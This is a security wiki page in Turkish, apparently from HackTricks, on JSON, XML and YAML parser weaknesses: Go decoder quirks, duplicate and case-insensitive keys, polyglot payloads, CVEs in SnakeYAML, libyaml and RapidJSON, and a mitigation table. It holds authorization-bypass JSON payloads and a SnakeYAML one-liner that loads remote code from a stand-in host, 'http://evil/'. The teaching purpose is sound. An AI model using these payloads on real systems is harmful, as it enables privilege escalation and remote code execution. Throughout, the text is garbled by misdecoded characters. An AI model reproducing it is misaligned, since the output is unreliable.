# JSON, XML & Yaml Hacking & Sorunlar

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

AÅŸaÄŸÄ±daki sorunlar Go JSON'da tespit edildi, ancak diÄŸer dillerde de var olabilir. Bu sorunlar [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/) adresinde yayÄ±mlandÄ±.

Goâ€™nin JSON, XML ve YAML ayrÄ±ÅŸtÄ±rÄ±cÄ±larÄ±, kÃ¶tÃ¼ye kullanÄ±labilecek tutarsÄ±zlÄ±klar ve gÃ¼vensiz varsayÄ±lanlar uzun bir geÃ§miÅŸine sahiptir; bunlar **bypass authentication**, **escalate privileges**, veya **exfiltrate sensitive data** iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir.

### (Un)Marshaling Unexpected Data

AmaÃ§, bir saldÄ±rganÄ±n hassas alanlarÄ± okuyup/yazmasÄ±na izin veren struct'larÄ± istismar etmektir (Ã¶rn., `IsAdmin`, `Password`).

- Ã–rnek Struct:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- YaygÄ±n Zafiyetler

1. **Missing tag** (no tag = field is still parsed by default):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **`-` iÅŸaretinin yanlÄ±ÅŸ kullanÄ±mÄ±**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // âŒ wrong
}
```
Payload:
```json
{"-": true}
```
âœ”ï¸ Bir alanÄ±n (un)marshaled edilmesini engellemenin doÄŸru yolu:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Parser FarklÄ±lÄ±klarÄ±

AmaÃ§, farklÄ± parser'larÄ±n aynÄ± payload'u farklÄ± yorumlamasÄ±ndan yararlanarak bypass authorization yapmaktÄ±r; Ã¶rneÄŸin:
- CVE-2017-12635: Apache CouchDB bypass via duplicate keys
- 2022: Zoom 0-click RCE via XML parser inconsistency
- GitLab 2025 SAML bypass via XML quirks


**1. Yinelenen Alanlar:**
Go'nun `encoding/json` **son** alanÄ± alÄ±r.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
DiÄŸer ayrÄ±ÅŸtÄ±rÄ±cÄ±lar (Ã¶r. Javaâ€™s Jackson) **first**'Ä± alabilir.

**2. BÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarsÄ±zlÄ±ÄŸÄ±:**
Go bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harfe duyarsÄ±zdÄ±r:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Unicode hileleri bile iÅŸe yarÄ±yor:
```go
json.Unmarshal([]byte(`{"aâ„ªtionÅ¿": "bypass"}`), &req)
```
**3. Servisler arasÄ± uyumsuzluk:**
DÃ¼ÅŸÃ¼nÃ¼n:
- Go ile yazÄ±lmÄ±ÅŸ Proxy
- Python ile yazÄ±lmÄ±ÅŸ AuthZ servisi

SaldÄ±rgan gÃ¶nderir:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python `UserAction`'Ä± gÃ¶rÃ¼r, izin verir
- Go `AdminAction`'Ä± gÃ¶rÃ¼r, Ã§alÄ±ÅŸtÄ±rÄ±r


### Veri FormatÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± (Polyglots)

AmaÃ§, formatlarÄ± karÄ±ÅŸtÄ±ran (JSON/XML/YAML) veya parser hatalarÄ±nda aÃ§Ä±k bÄ±rakan (fail open) sistemleri istismar etmektir, Ã¶rneÄŸin:
- **CVE-2020-16250**: HashiCorp Vault, STS XML yerine JSON dÃ¶ndÃ¼ÄŸÃ¼nde JSON'u XML ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±yla iÅŸledi.

SaldÄ±rganÄ±n kontrolÃ¼:
- `Accept: application/json` baÅŸlÄ±ÄŸÄ±
- JSON gÃ¶vdesi Ã¼zerinde kÄ±smi kontrol

Goâ€™nun XML ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ± yine de bunu ayrÄ±ÅŸtÄ±rdÄ± ve enjekte edilen kimliÄŸe gÃ¼vendi.

- Crafted payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
SonuÃ§:
- **Go JSON** parser: `Action_2` (bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harfe duyarsÄ±z + sonuncu kazanÄ±r)
- **YAML** parser: `Action_1` (bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarlÄ±)
- **XML** parser: string iÃ§inde `"Action_3"`'Ã¼ ayrÄ±ÅŸtÄ±rÄ±r

---

## Ã–nemli AyrÄ±ÅŸtÄ±rÄ±cÄ± Zafiyetleri (2023-2025)

> AÅŸaÄŸÄ±daki herkese aÃ§Ä±k olarak istismar edilebilen sorunlar, gÃ¼vensiz ayrÄ±ÅŸtÄ±rmanÄ±n Ã§ok dilli bir problem olduÄŸunu â€” sadece Go'ya Ã¶zgÃ¼ olmadÄ±ÄŸÄ±nÄ± â€” gÃ¶steriyor.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* Etkilenir: `org.yaml:snakeyaml` < **2.0** (Spring-Boot, Jenkins vb. tarafÄ±ndan kullanÄ±lÄ±r).
* KÃ¶k neden: `new Constructor()` deserializes **arbitrary Java classes**, allowing gadget chains that culminate in remote-code execution.
* One-liner PoC (zafiyetli hostta hesap makinesini aÃ§acaktÄ±r):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* DÃ¼zeltme / Hafifletme:
1. **â‰¥2.0'a yÃ¼kseltin** (`SafeLoader` varsayÄ±lan olarak kullanÄ±lÄ±r).
2. Eski sÃ¼rÃ¼mlerde aÃ§Ä±kÃ§a `new Yaml(new SafeConstructor())` kullanÄ±n.

### libyaml Double-Free (CVE-2024-35325)

* Etkilenir: `libyaml` â‰¤0.2.5 (birÃ§ok dil baÄŸlayÄ±cÄ±sÄ± tarafÄ±ndan kullanÄ±lan C kÃ¼tÃ¼phanesi).
* Sorun: `yaml_event_delete()`'nin iki kez Ã§aÄŸrÄ±lmasÄ±, saldÄ±rganlarÄ±n DoS'a veya bazÄ± senaryolarda heap exploitation'a dÃ¶nÃ¼ÅŸtÃ¼rebileceÄŸi bir double-free'ye yol aÃ§ar.
* Durum: Upstream â€œAPI misuseâ€ olarak reddetti, ancak Linux daÄŸÄ±tÄ±mlarÄ± iÅŸaretÃ§iyi savunmacÄ± ÅŸekilde null-free yapan yamalÄ± **0.2.6** sÃ¼rÃ¼mÃ¼nÃ¼ paketledi.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* Etkilenir: Tencent **RapidJSON** commit `8269bc2`'den (<1.1.0-patch-22) Ã¶nceki sÃ¼rÃ¼mler.
* Hata: `GenericReader::ParseNumber()` iÃ§inde kontrolsÃ¼z aritmetik, saldÄ±rganlarÄ±n sarmalayan ve heap'i bozacak bÃ¼yÃ¼k sayÄ±sal literal'ler oluÅŸturmasÄ±na izin verir â€” bu da nihayetinde ortaya Ã§Ä±kan nesne grafiÄŸi yetkilendirme kararlarÄ±nda kullanÄ±ldÄ±ÄŸÄ±nda privilege-escalation'a olanak saÄŸlayabilir.

---

### ğŸ” Hafifletmeler (GÃ¼ncellendi)

| Risk                                | DÃ¼zeltme / Ã–neri                                      |
|-------------------------------------|--------------------------------------------------------|
| Bilinmeyen alanlar (JSON)           | `decoder.DisallowUnknownFields()`                      |
| Tekrarlayan alanlar (JSON)          | âŒ stdlib'da dÃ¼zeltme yok â€” [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) ile doÄŸrulayÄ±n |
| BÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harfe duyarsÄ±z eÅŸleme (Go) | âŒ DÃ¼zeltme yok â€” struct tag'larÄ±nÄ± doÄŸrulayÄ±n + girdiyi Ã¶nceden kanonikleÅŸtirin |
| XML Ã§Ã¶p verisi / XXE                | GÃ¼Ã§lendirilmiÅŸ bir ayrÄ±ÅŸtÄ±rÄ±cÄ± kullanÄ±n (`encoding/xml` + `DisallowDTD`) |
| YAML bilinmeyen anahtarlar          | `yaml.KnownFields(true)`                               |
| **Unsafe YAML deserialization**     | SafeConstructor kullanÄ±n / SnakeYAML â‰¥2.0'a yÃ¼kseltin  |
| libyaml â‰¤0.2.5 double-free          | **0.2.6**'ya veya daÄŸÄ±tÄ±m tarafÄ±ndan yamalanmÄ±ÅŸ sÃ¼rÃ¼me yÃ¼kseltin |
| RapidJSON <patched commit           | En son RapidJSON ile derleyin (â‰¥Temmuz 2024)           |

## See also

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## Referanslar

- Baeldung â€“ â€œResolving CVE-2022-1471 With SnakeYAML 2.0â€
- Ubuntu Security Tracker â€“ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
